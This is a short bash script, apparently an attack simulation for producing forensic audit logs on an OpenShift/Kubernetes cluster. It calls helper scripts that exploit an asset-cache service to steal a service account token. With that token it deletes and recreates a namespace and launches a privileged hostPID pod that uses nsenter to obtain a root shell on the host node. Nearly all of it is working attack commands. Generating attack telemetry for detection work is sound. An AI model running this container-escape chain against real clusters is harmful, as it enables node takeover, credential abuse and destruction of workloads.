### Run thi script to generate auditlogs information for the forensic analysis.

DIR="$( cd "$( dirname "${BASH_SOURCE[0]:-$0}" )" && pwd )"

sleep 60

### Pre-requisites - Get Visa ServiceAccount Token
$DIR/00_interactive_asset-cache.sh --ua curl --check
sleep 2
$DIR/00_interactive_asset-cache.sh --ua curl --check
sleep 2
$DIR/00_interactive_asset-cache.sh --ua curl --check
sleep 2
$DIR/00_interactive_asset-cache.sh --ua curl --check
sleep 2
$DIR/00_interactive_asset-cache.sh --ua curl --check
sleep 2
$DIR/00_interactive_asset-cache.sh --ua curl --check
sleep 2
$DIR/00_interactive_asset-cache.sh --ua curl --check
sleep 2
$DIR/01_expoit_asset-cache_get_visa_token.sh
$DIR/02_abuse_visa_serviceaccount_kubectl_from_pod.sh

### The Attack - Privileged Pod with hostPID to Escape to Host Node

# 0. Cleanup namespace
oc --token $(cat token) delete namespace payments-v2 --ignore-not-found=true --wait=true

# 1. Create a namespace
oc --token $(cat token) create namespace payments-v2

# 2. Deploy a standard app
oc --token $(cat token) -n payments-v2 create deployment mastercard-v2 --image alpine --port=8080 -- sleep infinity

# 3. Run a privileged pod with hostPID access (Container Escape vector)
oc --token $(cat token) run -n payments-v2 visa-processor --restart=Never --image alpine \
--overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'

# Wait for pod to be ready
oc --token $(cat token) wait --for=condition=Ready pod/visa-processor -n payments-v2 --timeout=60s

# 4. Access the root shell
oc --token $(cat token) -n payments-v2 rsh visa-processor

rm token
